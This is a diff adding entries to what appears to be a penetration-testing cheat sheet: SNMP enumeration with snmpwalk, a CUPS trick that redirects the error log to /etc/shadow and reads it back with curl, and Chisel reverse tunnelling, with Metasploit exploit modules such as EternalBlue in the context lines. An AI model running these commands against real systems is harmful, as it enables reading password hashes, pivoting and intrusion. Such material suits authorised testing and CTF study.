@@ -68,6 +68,13 @@ $ feroxbuster -u <URL>
 $ wfuzz -c -w <wordlist> -u http://FUZZ.<domain>
 ```
 
+- SNMP (udp/port 161)
+
+```
+$ snmpwalk -v 2c -c <community string> <IP address>
+$ snmpwalk -v 2c -c <community string> <IP address> .1.3.6.1.4.1.11.2.3.9.1.1.13.0
+```
+
 - SMB (port 445)
 
 ```
@@ -82,6 +89,13 @@ msf> use auxiliary/scanner/smb/smb_version
 msf> use exploit/windows/smb/ms17_010_eternalblue
 msf> use exploit/windows/smb/ms08_067_netapi
 msf> use exploit/multi/samba/usermap_script
+```
+
+- CUPS (port 631)
+
+```
+$ cupsctl ErrorLog="/etc/shadow"
+$ curl http://<IP address>:631/admin/log/error_log?
 ```
 
 - Rsync (port 873)
@@ -242,6 +256,14 @@ $ ssh -D 1234 <username>@<remote IP address>
 ```
 Edit /etc/proxychains4.conf
 $ proxychains <command>
+```
+
+- Chisel
+
+```
+https://github.com/jpillora/chisel
+$ sudo ./chisel server -p 8000 --reverse
+$ ./chisel client <IP address>:8000 R:631:127.0.0.1:631
 ```
 
 - PsExec
